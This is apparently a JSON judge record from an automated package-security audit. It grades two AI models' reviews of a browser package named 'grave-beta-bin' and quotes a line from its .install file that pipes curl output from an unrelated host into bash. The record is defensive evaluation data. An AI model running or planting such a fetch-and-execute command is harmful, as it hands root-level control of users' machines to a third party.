@@ -1,0 +1,28 @@
+{
+  "package": "grave-beta-bin",
+  "correct_verdict": "unsafe",
+  "confidence": "high",
+  "reasoning": "Both models correctly identified a critical supply-chain attack vector in grave-beta-bin.install: the file executes `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. This downloads and immediately executes code from an unrelated third-party host (gitflic.ru via web.archive.org) with no integrity verification. The package claims to install Brave Beta browser from official GitHub releases, making this remote execution from an unrelated host a clear injection pattern that serves no legitimate packaging purpose. This matches the threat model's definition of dangerous behavior: executing fetched content from a host the package has no stated relationship with.",
+  "disagreement_analysis": null,
+  "coverage_issues": [],
+  "false_positives": [],
+  "false_negatives": [],
+  "re_audit_recommended": false,
+  "re_audit_focus": [],
+  "learnings": [
+    "Both models correctly prioritized the .install file and identified the curl|bash pattern as a critical supply-chain risk, demonstrating good file selection heuristics",
+    "Models correctly distinguished between legitimate upstream behavior (Brave browser functionality) and injected malicious code (remote script execution from unrelated host)",
+    "The audit tool's file selection correctly included .install files, which are as critical as PKGBUILD since they execute with root privileges during package installation",
+    "Models appropriately did not flag the package name discrepancy (grave-beta-bin vs brave-beta-bin) as a security issue, correctly focusing on actual code injection rather than naming inconsistencies"
+  ],
+  "_judge_usage": {
+    "model": "qwen/qwen3.7-plus",
+    "prompt_tokens": 8507,
+    "completion_tokens": 1084,
+    "cost": 0.00410976
+  },
+  "audits_judged": [
+    "20261014-030803-qwen-qwen3-235b-a22b-2507.md",
+    "20261014-030844-deepseek-deepseek-v4-flash.md"
+  ]
+}
